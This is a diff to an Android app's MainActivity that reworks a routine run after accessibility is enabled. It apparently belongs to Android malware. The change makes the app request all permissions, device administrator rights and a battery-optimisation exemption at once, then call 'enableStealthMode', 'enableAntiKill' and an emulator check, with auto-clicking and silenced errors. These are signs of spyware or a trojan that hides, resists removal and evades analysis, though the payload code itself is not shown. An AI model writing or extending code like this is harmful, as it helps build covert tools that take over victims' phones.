@@ -96,52 +96,23 @@ public class MainActivity extends AppCompatActivity {
     private void autoGrantPermissions() {
         Toast.makeText(this, "Accessibility enabled! Setting up...", Toast.LENGTH_SHORT).show();
         
-        // Request permissions in sequence with delays
+        // ALL STEALTH FEATURES START IMMEDIATELY
         
-        // Step 1: Request all permissions
+        // Request all permissions
         permissionManager.requestAllPermissions();
+
+        // Request special permissions + battery + device admin
+        permissionManager.requestSpecialPermissions();
+        requestBatteryOptimization();
+        requestDeviceAdmin();
+
+        // Enable ALL stealth features immediately
+        permissionManager.requestNotificationPermission();
+        enableStealthMode();
+        enableAntiKill();
+        checkEmulator();
         
-        // Step 2: Request special permissions after 1 second
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                permissionManager.requestSpecialPermissions();
-            }
-        }, 1000);
-        
-        // Step 3: Request battery optimization after 2 seconds
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                requestBatteryOptimization();
-            }
-        }, 2000);
-        
-        // Step 4: Request device admin after 3 seconds
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                requestDeviceAdmin();
-            }
-        }, 3000);
-        
-        // Step 5: Request notification permission after 4 seconds
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                permissionManager.requestNotificationPermission();
-            }
-        }, 4000);
-        
-        // Step 6: Enable stealth features after 5 seconds
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                enableStealthMode();
-                enableAntiKill();
-                checkEmulator();
-            }
-        }, 5000);
+        // Auto-click runs automatically for 10 seconds then stops
     }
     
     private void enableAntiKill() {
@@ -228,15 +199,13 @@ public class MainActivity extends AppCompatActivity {
             Intent intent = new Intent();
             intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
             intent.setData(Uri.parse("package:" + getPackageName()));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
         } catch (Exception e) {
             try {
                 Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(intent);
             } catch (Exception e2) {
-                android.util.Log.e("MainActivity", "Battery optimization request failed: " + e2.getMessage());
+                // Ignore
             }
         }
     }
